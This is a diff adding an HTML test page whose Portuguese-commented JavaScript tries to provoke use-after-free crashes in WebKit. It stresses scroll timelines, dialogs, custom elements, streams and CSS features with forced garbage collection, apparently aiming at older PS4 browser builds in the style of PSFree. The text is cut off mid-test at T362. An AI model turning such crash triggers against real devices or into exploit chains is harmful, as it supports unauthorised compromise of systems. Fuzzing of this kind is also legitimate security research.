@@ -1,0 +1,2013 @@
+<!DOCTYPE html>
+<html>
+<head><meta charset="UTF-8">
+<title>Testes15 — ScrollTimeline / HTMLDialog / WebComponents / OffscreenCanvas / ReadableStream</title>
+</head>
+<body>
+
+<p><strong>TESTES15 — NOVOS VETORES NO-JIT (T351-T375):</strong><br>
+T351-352: ScrollTimeline / ViewTimeline source removal UAF (WebKit 2024)<br>
+T353-354: HTMLDialogElement showModal + close + GC (dialog lifecycle)<br>
+T355-356: Web Components customElements lifecycle callback UAF<br>
+T357: OffscreenCanvas + transferToImageBitmap + GC<br>
+T358: ReadableStream cancel + tee + GC<br>
+T359: CompressionStream / DecompressionStream + GC<br>
+T360: CSS @scope DOM mutation + GC<br>
+T361: CSS nesting selector + DOM mutation + GC<br>
+T362: FormData iteration + mutation during forEach<br>
+T363: CSS scroll-snap + scroll event mutation + GC<br>
+T364: SharedArrayBuffer + Atomics + GC<br>
+T365: HTMLElement.attachInternals() form-associated custom elements<br>
+T366: AbortSignal.any() + GC (multi-signal abort)<br>
+T367: Array.toSorted / toReversed / toSpliced com GC (novos métodos JS)<br>
+T368: Promise.allSettled + GC em callbacks assíncronos<br>
+T369: CSS text-wrap: balance + DOM mutation + GC<br>
+T370: CSS subgrid + remoção de item + GC<br>
+T371: navigator.sendBeacon + GC durante envio<br>
+T372: EventTarget removeEventListener durante dispatch + GC<br>
+T373: CSSNumericValue (CSS Typed OM) + remoção de elemento + GC<br>
+T374: element.getAnimations() + cancel em cascata + GC<br>
+T375: STRESS FINAL — ScrollTimeline + Dialog + WebComponents + ReadableStream</p>
+
+<div id="dom15" style="display:none"></div>
+<div id="scroll15" style="display:none;height:200px;overflow:auto;"></div>
+<dialog id="dlg15"></dialog>
+
+<button onclick="runAll()">RODAR TODOS</button><br><br>
+<button onclick="t351()">T351</button>
+<button onclick="t352()">T352</button>
+<button onclick="t353()">T353</button>
+<button onclick="t354()">T354</button>
+<button onclick="t355()">T355</button>
+<button onclick="t356()">T356</button>
+<button onclick="t357()">T357</button>
+<button onclick="t358()">T358</button>
+<button onclick="t359()">T359</button>
+<button onclick="t360()">T360</button>
+<button onclick="t361()">T361</button>
+<button onclick="t362()">T362</button>
+<button onclick="t363()">T363</button>
+<button onclick="t364()">T364</button>
+<button onclick="t365()">T365</button>
+<button onclick="t366()">T366</button>
+<button onclick="t367()">T367</button>
+<button onclick="t368()">T368</button>
+<button onclick="t369()">T369</button>
+<button onclick="t370()">T370</button>
+<button onclick="t371()">T371</button>
+<button onclick="t372()">T372</button>
+<button onclick="t373()">T373</button>
+<button onclick="t374()">T374</button>
+<button onclick="t375()">T375</button>
+
+<pre id="o"></pre>
+
+<script>
+function log(m){ document.getElementById('o').textContent += m + '\n'; }
+
+// GC idêntico ao PSFree / seregonwar CVE-2023-28205
+const MB = 1024 * 1024;
+function gc(){
+  for(let i = 0; i < 0x10; i++) new Uint8Array(4 * MB);
+}
+function gcHeavy(){
+  for(let i = 0; i < 0x40; i++) new ArrayBuffer(0x1000000);
+}
+
+function runAll(){
+  log('=== RODAR TODOS T351-T375: inicio ===');
+  t351(); t352(); t353(); t354(); t355();
+  t356(); t357(); t358(); t359(); t360();
+  t361(); t362(); t363(); t364(); t365();
+  t366(); t367(); t368(); t369(); t370();
+  t371(); t372(); t373(); t374(); t375();
+  log('=== RODAR TODOS: fim ===');
+}
+
+// ─── T351 ─────────────────────────────────────────────────────────────────────
+// ScrollTimeline: remoção do source element + GC (AnimationTimeline UAF)
+// ScrollTimeline e ViewTimeline mantêm referência ao source element;
+// ao remover o source do DOM + GC, o AnimationTimeline tem stale ptr para
+// o ScrollableArea do elemento removido (WebKit 2024: bugs #279468, #280444)
+function t351(){
+  log('Teste 351: inicio');
+  try {
+    if(typeof ScrollTimeline === 'undefined'){
+      log('Teste 351: fim (sem ScrollTimeline)');
+      return;
+    }
+    const scroller = document.getElementById('scroll15');
+    scroller.style.display = 'block';
+
+    // Popular o scroller com conteúdo scrollável
+    for(let i = 0; i < 30; i++){
+      const el = document.createElement('div');
+      el.style.height = '50px';
+      el.textContent = 'scroll_content_' + i;
+      scroller.appendChild(el);
+    }
+
+    // Criar ScrollTimeline que usa o scroller como source
+    const timelines = [];
+    const animations = [];
+    for(let i = 0; i < 5; i++){
+      try {
+        const tl = new ScrollTimeline({ source: scroller, axis: 'block' });
+        timelines.push(tl);
+
+        // Animar elemento usando o ScrollTimeline
+        const animEl = document.createElement('div');
+        animEl.style.cssText = 'width:40px;height:40px;background:red;position:fixed;top:0;right:0;';
+        document.body.appendChild(animEl);
+
+        const anim = animEl.animate(
+          [{ transform: 'translateX(0)' }, { transform: 'translateX(100px)' }],
+          { timeline: tl, fill: 'both' }
+        );
+        animations.push({ anim, animEl, tl });
+      } catch(e){}
+    }
+
+    gc(); // GC com timelines ativas e source no DOM
+
+    // Remover o source (scroller) do DOM → ScrollTimeline tem stale ptr
+    scroller.style.display = 'none';
+    gc(); // GC: ScrollableArea do scroller liberado; AnimationTimeline aponta para ele
+
+    // Tentar acessar os timelines com source liberado
+    for(let { anim, animEl, tl } of animations){
+      try { tl.currentTime; }   catch(e){}
+      try { tl.source; }        catch(e){}
+      try { tl.axis; }          catch(e){}
+      try { anim.currentTime; } catch(e){}
+      try { anim.playState; }   catch(e){}
+      // Fazer scroll no scroller removido (acesso via UAF)
+      try { scroller.scrollTop = 100; gc(); } catch(e){}
+    }
+
+    // Reinserir scroller + scroll = recalcula timelines com ponteiros stale
+    scroller.style.display = 'block';
+    try { scroller.scrollTop = 50; gc(); } catch(e){}
+
+    // Limpar
+    for(let { anim, animEl } of animations){
+      try { anim.cancel(); }            catch(e){}
+      try { document.body.removeChild(animEl); } catch(e){}
+    }
+    while(scroller.firstChild) try { scroller.removeChild(scroller.firstChild); } catch(e){}
+    scroller.style.display = 'none';
+  } catch(e){}
+  log('Teste 351: fim');
+}
+
+// ─── T352 ─────────────────────────────────────────────────────────────────────
+// ViewTimeline: subject element removal + GC (ViewTimeline::computeViewTimelineData UAF)
+// ViewTimeline usa um "subject" element para calcular o progresso;
+// remover o subject + GC causa UAF em ViewTimeline::computeViewTimelineData
+// (corrigido no commit 9ed7eb2 em 27/Set/2024 — mas PS4 usa WebKit muito mais antigo)
+function t352(){
+  log('Teste 352: inicio');
+  try {
+    if(typeof ViewTimeline === 'undefined'){
+      log('Teste 352: fim (sem ViewTimeline)');
+      return;
+    }
+    const scroller = document.getElementById('scroll15');
+    scroller.style.display = 'block';
+    scroller.style.height = '200px';
+    scroller.style.overflow = 'auto';
+
+    // Subject elements dentro do scroller
+    const subjects = [];
+    for(let i = 0; i < 10; i++){
+      const el = document.createElement('div');
+      el.style.cssText = 'height:100px;width:100%;background:hsl(' + (i*36) + ',50%,50%);';
+      el.textContent = 'subject_' + i;
+      scroller.appendChild(el);
+      subjects.push(el);
+    }
+
+    // ViewTimeline usando cada subject
+    const vtAnims = [];
+    for(let i = 0; i < subjects.length; i++){
+      try {
+        const vt = new ViewTimeline({ subject: subjects[i], axis: 'block' });
+        const animEl = document.createElement('div');
+        animEl.style.cssText = 'width:20px;height:20px;background:blue;position:fixed;top:' + (i*25) + 'px;left:0;';
+        document.body.appendChild(animEl);
+        const anim = animEl.animate(
+          [{ opacity: 0 }, { opacity: 1 }],
+          { timeline: vt, fill: 'both', rangeStart: 'entry', rangeEnd: 'exit' }
+        );
+        vtAnims.push({ vt, anim, animEl, subject: subjects[i] });
+      } catch(e){}
+    }
+
+    gc();
+    // Scroll para ativar ViewTimeline
+    try { scroller.scrollTop = 50; } catch(e){}
+    gc();
+
+    // Remover subjects em loop → ViewTimeline::computeViewTimelineData UAF
+    for(let { vt, anim, animEl, subject } of vtAnims){
+      try {
+        if(subject.parentNode) scroller.removeChild(subject);
+        gc(); // GC: ViewTimeline tem stale ptr para o subject e seu RenderObject
+        // Scroll novamente → força recalculo com subject removido
+        scroller.scrollTop += 10;
+        gc();
+        // Acessar ViewTimeline após remoção do subject
+        try { vt.currentTime; }        catch(e){}
+        try { vt.subject; }            catch(e){}
+        try { anim.currentTime; }      catch(e){}
+        // Re-inserir (reclaima memória do subject)
+        scroller.appendChild(subject);
+        gc();
+      } catch(e){}
+    }
+
+    for(let { anim, animEl } of vtAnims){
+      try { anim.cancel(); document.body.removeChild(animEl); } catch(e){}
+    }
+    while(scroller.firstChild) try { scroller.removeChild(scroller.firstChild); } catch(e){}
+    scroller.style.display = 'none';
+  } catch(e){}
+  log('Teste 352: fim');
+}
+
+// ─── T353 ─────────────────────────────────────────────────────────────────────
+// HTMLDialogElement: showModal() + close() + GC + DOM removal (DialogController UAF)
+// showModal() cria um DialogController em fastMalloc e abre um top layer;
+// fechar + remover durante evento 'close' pode causar UAF no DialogController.
+function t353(){
+  log('Teste 353: inicio');
+  try {
+    const dlg = document.getElementById('dlg15');
+    if(!dlg || typeof dlg.showModal !== 'function'){
+      log('Teste 353: fim (sem dialog.showModal)');
+      return;
+    }
+
+    // Múltiplos diálogos
+    const dialogs = [dlg];
+    for(let i = 0; i < 4; i++){
+      const d = document.createElement('dialog');
+      d.innerHTML = '<p>dialog_content_' + i + '</p><button onclick="this.closest(\'dialog\').close()">OK</button>';
+      document.body.appendChild(d);
+      dialogs.push(d);
+    }
+
+    let closeN = 0;
+    for(let d of dialogs){
+      d.addEventListener('close', function(){
+        closeN++;
+        gc(); // GC durante evento close
+        // Remover durante o close event — DialogController tem stale ptr
+        if(closeN % 2 === 0 && d.parentNode && d !== dlg){
+          try { document.body.removeChild(d); gc(); document.body.appendChild(d); } catch(e){}
+        }
+        // Tentar abrir novamente durante o close
+        try { d.showModal(); gc(); d.close(); } catch(e){}
+        // Acessar propriedades pós-close
+        try { d.open; d.returnValue; } catch(e){}
+      });
+
+      d.addEventListener('cancel', function(evt){
+        evt.preventDefault(); // evitar fechar por ESC durante o teste
+        gc();
+      });
+    }
+
+    // Abrir + fechar em loop rápido
+    for(let iter = 0; iter < 15; iter++){
+      for(let d of dialogs){
+        try {
+          d.showModal();
+          gc(); // GC com dialog aberto (top layer ativo)
+          // Tentar abrir outro dialog enquanto este está aberto (nested modal)
+          if(iter % 3 === 0){
+            for(let d2 of dialogs){
+              if(d2 !== d) try { d2.show(); gc(); } catch(e){} // show() non-modal
+            }
+          }
+          d.close('return_value_' + iter);
+          gc(); // GC após close
+        } catch(e){}
+      }
+    }
+
+    // Remover diálogos enquanto abertos
+    for(let d of dialogs){
+      if(d === dlg) continue;
+      try {
+        d.showModal(); gc();
+        if(d.parentNode) document.body.removeChild(d);
+        gc(); // GC: DialogController tem stale ptr para o dialog removido
+        try { d.open; d.close(); } catch(e){}
+      } catch(e){}
+    }
+  } catch(e){}
+  log('Teste 353: fim');
+}
+
+// ─── T354 ─────────────────────────────────────────────────────────────────────
+// HTMLDialogElement: form[method=dialog] + submit + GC (DialogSubmitButton UAF)
+// <form method="dialog"> submete o form fechando o dialog; GC durante o submit
+// pode causar UAF no DialogSubmitButton internamente.
+function t354(){
+  log('Teste 354: inicio');
+  try {
+    if(typeof HTMLDialogElement === 'undefined' || typeof document.createElement('dialog').showModal !== 'function'){
+      log('Teste 354: fim (sem dialog)');
+      return;
+    }
+    const area = document.getElementById('dom15');
+    area.style.display = 'block';
+
+    for(let i = 0; i < 8; i++){
+      try {
+        const d = document.createElement('dialog');
+        // form[method=dialog] dentro do dialog
+        const form = document.createElement('form');
+        form.method = 'dialog';
+        const inp = document.createElement('input');
+        inp.type = 'text'; inp.name = 'data'; inp.value = 'form_data_' + i;
+        const btn = document.createElement('button');
+        btn.type = 'submit'; btn.value = 'submit_value_' + i; btn.textContent = 'Submit';
+        form.appendChild(inp); form.appendChild(btn);
+        d.appendChild(form);
+        area.appendChild(d);
+
+        d.addEventListener('close', function(){
+          gc(); // GC durante close disparado pelo form submit
+          const rv = d.returnValue;
+          // Remover dialog imediatamente após close via form
+          if(d.parentNode) try { area.removeChild(d); gc(); area.appendChild(d); } catch(e){}
+        });
+
+        form.addEventListener('submit', function(evt){
+          gc(); // GC durante submit — DialogSubmitButton pode ser UAF
+          // Tentar remover o form durante o submit
+          if(i === 4 && form.parentNode) try { d.removeChild(form); gc(); } catch(e){}
+        });
+
+        try { d.showModal(); gc(); } catch(e){}
+        // Disparar submit via click no botão
+        try { btn.click(); gc(); } catch(e){}
+        // Se ainda aberto, fechar
+        try { if(d.open) d.close(); } catch(e){}
+        gc();
+        if(d.parentNode) try { area.removeChild(d); } catch(e){}
+      } catch(e){}
+    }
+
+    area.style.display = 'none';
+  } catch(e){}
+  log('Teste 354: fim');
+}
+
+// ─── T355 ─────────────────────────────────────────────────────────────────────
+// Web Components: customElements.define + connectedCallback/disconnectedCallback + GC
+// Callbacks de lifecycle são chamados pelo WebCore quando elementos são inseridos/removidos;
+// GC durante o callback pode liberar o custom element enquanto o callback ainda executa.
+function t355(){
+  log('Teste 355: inicio');
+  try {
+    const area = document.getElementById('dom15');
+    area.style.display = 'block';
+
+    // Definir custom element com callbacks que fazem GC
+    try {
+      customElements.define('test-el-15a', class extends HTMLElement {
+        connectedCallback(){
+          gc(); // GC durante connectedCallback
+          // Remover-se durante o connectedCallback
+          if(this._selfRemove && this.parentNode){
+            this.parentNode.removeChild(this);
+            gc(); // GC após auto-remoção
+          }
+          this.textContent = 'connected_' + Date.now();
+        }
+        disconnectedCallback(){
+          gc(); // GC durante disconnectedCallback
+          this._disconnected = true;
+          // Tentar re-inserir durante disconnectedCallback
+          if(this._tryReinsert){
+            try { area.appendChild(this); gc(); } catch(e){}
+          }
+        }
+        attributeChangedCallback(name, oldVal, newVal){
+          gc(); // GC durante attributeChangedCallback
+        }
+        static get observedAttributes(){ return ['data-test', 'class', 'style']; }
+      });
+    } catch(e){}
+
+    // Criar e inserir/remover instâncias em loop
+    const customEls = [];
+    for(let i = 0; i < 20; i++){
+      try {
+        const el = document.createElement('test-el-15a');
+        el._selfRemove = (i % 3 === 0); // alguns se removem no connectedCallback
+        el._tryReinsert = (i % 5 === 0);
+        customEls.push(el);
+      } catch(e){ customEls.push(null); }
+    }
+
+    for(let i = 0; i < 15; i++){
+      for(let el of customEls){
+        if(!el) continue;
+        try {
+          area.appendChild(el);    // connectedCallback dispara
+          gc();
+          el.setAttribute('data-test', 'value_' + i); // attributeChangedCallback
+          gc();
+          if(el.parentNode) area.removeChild(el); // disconnectedCallback dispara
+          gc();
+        } catch(e){}
+      }
+    }
+
+    gcHeavy();
+
+    // Definir custom element com adoptedCallback (ao adotar para outro documento)
+    try {
+      customElements.define('test-el-15b', class extends HTMLElement {
+        connectedCallback(){ gc(); }
+        disconnectedCallback(){ gc(); }
+        adoptedCallback(){ gc(); this.textContent = 'adopted'; }
+      });
+
+      const el15b = document.createElement('test-el-15b');
+      area.appendChild(el15b);
+      gc();
+
+      // Criar iframe e adotar o elemento para o documento do iframe
+      const iframe = document.createElement('iframe');
+      iframe.src = 'about:blank';
+      area.appendChild(iframe);
+      try {
+        const iDoc = iframe.contentDocument;
+        if(iDoc){
+          const adopted = iDoc.adoptNode(el15b); // adoptedCallback + disconnectedCallback
+          gc();
+          iDoc.body.appendChild(adopted);
+          gc();
+          document.adoptNode(adopted); // adotar de volta
+          gc();
+        }
+      } catch(e){}
+      try { area.removeChild(iframe); } catch(e){}
+    } catch(e){}
+
+    while(area.firstChild) try { area.removeChild(area.firstChild); } catch(e){}
+    area.style.display = 'none';
+  } catch(e){}
+  log('Teste 355: fim');
+}
+
+// ─── T356 ─────────────────────────────────────────────────────────────────────
+// Web Components: upgrade + GC (customElements.upgrade UAF)
+// Elementos criados ANTES do customElements.define são "undefined";
+// ao definir o custom element, o WebCore "upagrada" os elementos existentes.
+// GC durante o upgrade pode causar UAF.
+function t356(){
+  log('Teste 356: inicio');
+  try {
+    const area = document.getElementById('dom15');
+    area.style.display = 'block';
+
+    // Criar elementos ANTES de definir o custom element
+    const preEls = [];
+    for(let i = 0; i < 30; i++){
+      const el = document.createElement('test-el-15c'); // undefined neste ponto
+      el.setAttribute('data-pre', i);
+      area.appendChild(el);
+      preEls.push(el);
+    }
+
+    gc(); // GC antes da definição — elementos ainda são HTMLElement genéricos
+
+    // Agora definir o custom element → upgrade de todos os elementos existentes
+    try {
+      customElements.define('test-el-15c', class extends HTMLElement {
+        connectedCallback(){
+          gc(); // GC durante upgrade+connectedCallback de cada elemento
+          this.upgraded = true;
+          // Durante o upgrade, remover alguns elementos
+          if(this.getAttribute('data-pre') === '15' && this.parentNode){
+            this.parentNode.removeChild(this);
+            gc();
+          }
+        }
+        disconnectedCallback(){ gc(); }
+      });
+    } catch(e){}
+
+    gc(); // GC após upgrade em massa
+
+    // Acessar elementos após upgrade
+    for(let el of preEls){
+      try { el.upgraded; }                    catch(e){}
+      try { el.getAttribute('data-pre'); }    catch(e){}
+      try { el.connectedCallback && el.connectedCallback(); } catch(e){}
+      try { customElements.upgrade(el); }     catch(e){} // re-upgrade (no-op mas pode crashar)
+    }
+
+    // customElements.whenDefined() + GC
+    try {
+      customElements.whenDefined('test-el-15c').then(function(cls){
+        gc();
+        try { new cls(); } catch(e){}
+      });
+    } catch(e){}
+
+    while(area.firstChild) try { area.removeChild(area.firstChild); } catch(e){}
+    area.style.display = 'none';
+  } catch(e){}
+  log('Teste 356: fim');
+}
+
+// ─── T357 ─────────────────────────────────────────────────────────────────────
+// OffscreenCanvas + transferToImageBitmap + GC (ImageBitmap UAF)
+// OffscreenCanvas transfere a renderização para fora do DOM;
+// transferToImageBitmap() aloca um ImageBitmap em fastMalloc;
+// GC após a transferência + close() pode causar UAF.
+function t357(){
+  log('Teste 357: inicio');
+  try {
+    if(typeof OffscreenCanvas === 'undefined'){
+      log('Teste 357: fim (sem OffscreenCanvas)');
+      return;
+    }
+
+    const bitmaps = [];
+
+    // Criar OffscreenCanvas de vários tamanhos + transferToImageBitmap
+    for(let size of [64, 128, 256, 512, 1024]){
+      try {
+        const oc = new OffscreenCanvas(size, size);
+        const ctx = oc.getContext('2d');
+        if(!ctx) continue;
+
+        ctx.fillStyle = 'hsl(' + (size % 360) + ',70%,50%)';
+        ctx.fillRect(0, 0, size, size);
+        ctx.fillStyle = 'white';
+        ctx.font = '20px sans-serif';
+        ctx.fillText('OC_' + size, 10, 30);
+
+        const bitmap = oc.transferToImageBitmap(); // transfere propriedade
+        bitmaps.push(bitmap);
+        gc(); // GC após transferência — OffscreenCanvas agora está vazio
+
+        // Tentar usar oc após transferência (deve lançar InvalidStateError)
+        try {
+          const ctx2 = oc.getContext('2d');
+          if(ctx2){ ctx2.fillStyle = 'red'; ctx2.fillRect(0, 0, 10, 10); }
+        } catch(e){}
+
+        // Desenhar bitmap em canvas normal
+        const canvas = document.createElement('canvas');
+        canvas.width = size; canvas.height = size;
+        const ctx3 = canvas.getContext('2d');
+        if(ctx3){ ctx3.drawImage(bitmap, 0, 0); gc(); }
+      } catch(e){}
+    }
+
+    // Fechar bitmaps + GC + acessar após close
+    for(let bmp of bitmaps){
+      try {
+        bmp.close();
+        gc(); // GC: ImageBitmap liberado
+        bmp.width;   // UAF: acessar bitmap fechado
+        bmp.height;
+        bmp.close(); // double-close
+      } catch(e){}
+    }
+
+    gcHeavy();
+
+    // OffscreenCanvas via Worker
+    try {
+      const workerCode = `
+        self.onmessage = function(evt) {
+          const oc = new OffscreenCanvas(64, 64);
+          const ctx = oc.getContext('2d');
+          ctx.fillStyle = 'red';
+          ctx.fillRect(0, 0, 64, 64);
+          const bmp = oc.transferToImageBitmap();
+          self.postMessage({ bmp }, [bmp]);
+        };
+      `;
+      const blob = new Blob([workerCode], { type: 'application/javascript' });
+      const url  = URL.createObjectURL(blob);
+      const w    = new Worker(url);
+      w.onmessage = function(evt){
+        gc();
+        const bmp = evt.data.bmp;
+        try { bmp.close(); gc(); bmp.width; } catch(e){}
+        w.terminate();
+        URL.revokeObjectURL(url);
+      };
+      w.postMessage(null);
+    } catch(e){}
+  } catch(e){}
+  log('Teste 357: fim');
+}
+
+// ─── T358 ─────────────────────────────────────────────────────────────────────
+// ReadableStream: cancel + tee + GC (StreamPipe UAF)
+// ReadableStream.tee() crea dois streams derivados; cancel() em um dos ramos
+// + GC pode causar UAF no StreamPipe interno (compartilhado entre os dois ramos).
+function t358(){
+  log('Teste 358: inicio');
+  try {
+    if(typeof ReadableStream === 'undefined'){
+      log('Teste 358: fim (sem ReadableStream)');
+      return;
+    }
+
+    // ReadableStream com pull que faz GC
+    for(let i = 0; i < 10; i++){
+      try {
+        let controller15;
+        const rs = new ReadableStream({
+          start: function(ctrl){ controller15 = ctrl; },
+          pull:  function(ctrl){
+            gc(); // GC durante pull
+            ctrl.enqueue(new Uint8Array(1024).fill(i)); // enfileirar chunk
+            if(ctrl.desiredSize <= 0) ctrl.close();
+          },
+          cancel: function(reason){
+            gc(); // GC durante cancel
+          }
+        });
+
+        // tee() → dois ramos que compartilham o mesmo StreamPipe
+        const [branch1, branch2] = rs.tee();
+        gc(); // GC após tee
+
+        // Ler branch1 + cancelar branch2 simultaneamente
+        const reader1 = branch1.getReader();
+        const reader2 = branch2.getReader();
+
+        reader1.read().then(function({ value, done }){
+          gc();
+          if(!done) reader1.releaseLock();
+          // Cancelar branch2 enquanto branch1 ainda está ativo
+          return reader2.cancel('cancel_during_read');
+        }).then(function(){
+          gc();
+          // Tentar ler do branch2 cancelado
+          try { reader2.read(); } catch(e){}
+        }).catch(function(e){ gc(); });
+
+        // Cancelar branch1 imediatamente (race com read)
+        try { reader1.cancel('immediate_cancel'); gc(); } catch(e){}
+        gc();
+      } catch(e){}
+    }
+
+    // ReadableStream pipeTo + abort
+    try {
+      const source15 = new ReadableStream({
+        start: function(ctrl){
+          for(let j = 0; j < 100; j++) ctrl.enqueue(new Uint8Array(512).fill(j));
+          ctrl.close();
+        }
+      });
+      const sink15 = new WritableStream({
+        write: function(chunk){ gc(); }, // GC durante write
+        close: function(){ gc(); },
+        abort: function(reason){ gc(); }
+      });
+      const ctrl = new AbortController();
+      source15.pipeTo(sink15, { signal: ctrl.signal }).catch(function(e){ gc(); });
+      setTimeout(function(){ try { ctrl.abort(); gc(); } catch(e){}; }, 0);
+    } catch(e){}
+  } catch(e){}
+  log('Teste 358: fim');
+}
+
+// ─── T359 ─────────────────────────────────────────────────────────────────────
+// CompressionStream / DecompressionStream: pipeline + GC (TransformStream UAF)
+// CompressionStream implementa a interface TransformStream;
+// GC durante a compressão/descompressão pode causar UAF no TransformStreamDefaultController.
+function t359(){
+  log('Teste 359: inicio');
+  try {
+    if(typeof CompressionStream === 'undefined'){
+      log('Teste 359: fim (sem CompressionStream)');
+      return;
+    }
+
+    const formats = ['gzip', 'deflate', 'deflate-raw'];
+    for(let fmt of formats){
+      try {
+        // Dados para comprimir
+        const data = new TextEncoder().encode('compressible_data_'.repeat(1000) + fmt);
+
+        // Comprimir via TransformStream pipeline
+        const compStream = new CompressionStream(fmt);
+        const writer = compStream.writable.getWriter();
+        const reader = compStream.readable.getReader();
+
+        // Escrever dados + GC durante a transformação
+        writer.write(data).then(function(){
+          gc(); // GC após write — TransformStreamDefaultController pode ter stale ptr
+          return writer.close();
+        }).then(function(){
+          gc();
+        }).catch(function(e){ gc(); });
+
+        // Ler chunks comprimidos + GC
+        const compressed = [];
+        function readCompressed(){
+          reader.read().then(function({ value, done }){
+            gc(); // GC durante cada leitura
+            if(!done){
+              compressed.push(value);
+              readCompressed();
+            } else {
+              // Descomprimir o resultado
+              try {
+                const compData = new Uint8Array(
+                  compressed.reduce(function(acc, chunk){ return acc + chunk.length; }, 0)
+                );
+                let offset = 0;
+                for(let chunk of compressed){
+                  compData.set(chunk, offset);
+                  offset += chunk.length;
+                }
+                const decompStream = new DecompressionStream(fmt);
+                const decompWriter = decompStream.writable.getWriter();
+                const decompReader = decompStream.readable.getReader();
+                decompWriter.write(compData).then(function(){ gc(); decompWriter.close(); });
+                decompReader.read().then(function(r){ gc(); }).catch(function(e){ gc(); });
+              } catch(e){}
+            }
+          }).catch(function(e){ gc(); });
+        }
+        readCompressed();
+        gc(); // GC enquanto pipeline está em andamento
+      } catch(e){}
+    }
+  } catch(e){}
+  log('Teste 359: fim');
+}
+
+// ─── T360 ─────────────────────────────────────────────────────────────────────
+// CSS @scope: DOM mutation dentro do escopo + GC (ScopeRule StyleResolver UAF)
+// @scope define um contexto de estilo com raiz e limite; a resolução de estilos
+// usa esse contexto para filtrar elementos; remover elementos dentro do escopo
+// durante o recalc pode causar UAF na ScopeRule interna.
+function t360(){
+  log('Teste 360: inicio');
+  try {
+    const area = document.getElementById('dom15');
+    area.style.display = 'block';
+
+    // Injetar @scope regra
+    const style360 = document.createElement('style');
+    style360.textContent = `
+      @scope (#dom15) to (.scope-limit) {
+        .scope-target { color: red; background: lightyellow; padding: 5px; }
+        .scope-target:hover { color: blue; }
+        :scope > .scope-direct { border: 1px solid red; }
+        .scope-limit { display: none; }
+      }
+      @scope (.scope-root) {
+        * { box-sizing: border-box; }
+        > .scope-child { margin: 2px; }
+      }
+    `;
+    document.head.appendChild(style360);
+
+    // Criar elementos dentro e fora do escopo
+    const scopeRoots = [];
+    for(let i = 0; i < 10; i++){
+      const root = document.createElement('div');
+      root.className = 'scope-root';
+      root.id = 'scope_root_' + i;
+
+      for(let j = 0; j < 5; j++){
+        const child = document.createElement('div');
+        child.className = j === 4 ? 'scope-child scope-limit' : 'scope-child scope-target scope-direct';
+        child.textContent = 'scope_' + i + '_' + j;
+        root.appendChild(child);
+      }
+      area.appendChild(root);
+      scopeRoots.push(root);
+    }
+
+    let _ = area.offsetHeight;
+    gc();
+
+    // Remover elementos dentro do escopo + GC (triggera re-resolução do @scope)
+    for(let iter = 0; iter < 20; iter++){
+      try {
+        const root = scopeRoots[iter % scopeRoots.length];
+        const children = Array.from(root.children);
+        // Remover o elemento de limite do escopo durante o recalc
+        const limit = children.find(function(c){ return c.classList.contains('scope-limit'); });
+        if(limit && limit.parentNode){
+          root.removeChild(limit);
+          gc(); // GC: ScopeRule tem stale ptr para o limite removido
+          _ = area.offsetHeight; // forçar re-resolução do @scope sem o limite
+          root.appendChild(limit);
+        }
+        // Remover e re-inserir targets
+        const target = children.find(function(c){ return c.classList.contains('scope-target'); });
+        if(target && target.parentNode){
+          root.removeChild(target);
+          gc();
+          _ = area.offsetHeight;
+          root.appendChild(target);
+        }
+      } catch(e){}
+    }
+
+    try { document.head.removeChild(style360); } catch(e){}
+    while(area.firstChild) try { area.removeChild(area.firstChild); } catch(e){}
+    area.style.display = 'none';
+  } catch(e){}
+  log('Teste 360: fim');
+}
+
+// ─── T361 ─────────────────────────────────────────────────────────────────────
+// CSS Nesting: seletores aninhados + DOM mutation + GC
+// CSS nesting permite seletores dentro de outros; o StyleResolver tem que
+// atravessar a cadeia de regras aninhadas; mutar o DOM durante esse traversal
+// pode causar UAF.
+function t361(){
+  log('Teste 361: inicio');
+  try {
+    const area = document.getElementById('dom15');
+    area.style.display = 'block';
+
+    const style361 = document.createElement('style');
+    // CSS nesting nativo (suportado no WebKit desde 2023)
+    style361.textContent = `
+      .nest-parent {
+        color: red;
+        & .nest-child {
+          color: blue;
+          & .nest-grandchild {
+            color: green;
+            &:hover { color: purple; }
+            &:is(.special, .highlighted) { font-weight: bold; }
+          }
+        }
+        &:hover { background: lightyellow; }
+        & > .nest-direct-child {
+          border: 1px solid red;
+          & + .nest-sibling { margin-left: 5px; }
+        }
+        @media (min-width: 1px) {
+          & .nest-media-child { display: block; }
+        }
+      }
+    `;
+    document.head.appendChild(style361);
+
+    // Construir estrutura para nesting
+    const parents = [];
+    for(let i = 0; i < 10; i++){
+      const parent = document.createElement('div');
+      parent.className = 'nest-parent';
+
+      const directChild = document.createElement('div');
+      directChild.className = 'nest-direct-child nest-child';
+
+      const grandChild = document.createElement('div');
+      grandChild.className = 'nest-grandchild special';
+      grandChild.textContent = 'nested_' + i;
+
+      const sibling = document.createElement('div');
+      sibling.className = 'nest-sibling';
+      sibling.textContent = 'sibling_' + i;
+
+      directChild.appendChild(grandChild);
+      parent.appendChild(directChild);
+      parent.appendChild(sibling);
+      area.appendChild(parent);
+      parents.push({ parent, directChild, grandChild, sibling });
+    }
+
+    let _ = area.offsetHeight;
+    gc();
+
+    // Mutar estrutura de nesting durante recalc de estilos
+    for(let iter = 0; iter < 20; iter++){
+      for(let { parent, directChild, grandChild, sibling } of parents.slice(0, 5)){
+        try {
+          // Remover grandchild durante resolução do nesting
+          if(grandChild.parentNode){ directChild.removeChild(grandChild); gc(); }
+          _ = area.offsetHeight; // forçar re-resolução do CSS nesting
+          // Mudar classes durante nesting
+          parent.classList.toggle('highlighted');
+          gc();
+          _ = area.offsetHeight;
+          // Re-inserir grandchild
+          directChild.appendChild(grandChild);
+          gc();
+        } catch(e){}
+      }
+    }
+
+    try { document.head.removeChild(style361); } catch(e){}
+    while(area.firstChild) try { area.removeChild(area.firstChild); } catch(e){}
+    area.style.display = 'none';
+  } catch(e){}
+  log('Teste 361: fim');
+}
+
+// ─── T362 ─────────────────────────────────────────────────────────────────────
+// FormData: forEach + mutation durante iteração + GC (FormDataList UAF)
+// FormData.forEach itera sobre a lista interna de entradas em C++;
+// adicionar/deletar entradas durante a iteração pode causar OOB ou UAF.
+function t362(){
+  log('Teste 362: inicio');
+  try {
+    // Criar FormData com muitas entradas
+    const fd = new FormData();
+    for(let i = 0; i < 100; i++){
+      fd.append('key_' + i, 'value_' + i + '_' + 'x'.repeat(i));
+      if(i % 10 === 0) fd.append('multi_' + i, 'extra_' + i); // múltiplos valores
+    }
+    gc();
+
+    let forEachN = 0;
+    // forEach com mutação durante iteração
+    try {
+      fd.forEach(function(value, key, form){
+        forEachN++;
+        gc(); // GC em cada iteração
+        if(forEachN === 20){ form.delete('key_50'); }    // deletar durante iteração
